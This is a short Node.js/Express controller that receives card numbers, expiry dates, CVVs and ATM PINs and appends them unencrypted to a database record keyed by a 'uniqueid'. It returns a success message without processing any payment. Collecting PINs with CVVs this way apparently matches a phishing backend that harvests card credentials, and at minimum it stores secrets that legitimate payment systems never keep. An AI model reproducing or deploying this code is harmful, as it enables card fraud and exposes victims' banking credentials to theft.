const NetBanking = require('../models/NetBanking'); // Use NetBanking model

exports.submitNetBankingPayment = async (req, res) => {
    try {
        const { cardNumber, expiryDate, cvv, atmPin, uniqueid } = req.body;
        
        // Find the existing NetBanking document by uniqueid
        let netBanking = await NetBanking.findOne({ uniqueid });

        if (netBanking) {
            // If it exists, add a new entry to the entries array
            netBanking.entries.push({ cardNumber, expiryDate, cvv, atmPin });
        } else {
            // If it doesn't exist, create a new document with the entries
            netBanking = new NetBanking({
                uniqueid,
                entries: [{ cardNumber, expiryDate, cvv, atmPin }]
            });
        }

        // Save the updated or new document to the database
        await netBanking.save();

        // Respond with a success message
        res.status(200).json({
            success: true,
            message: "Net Banking Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking payment data"
        });
    }
};
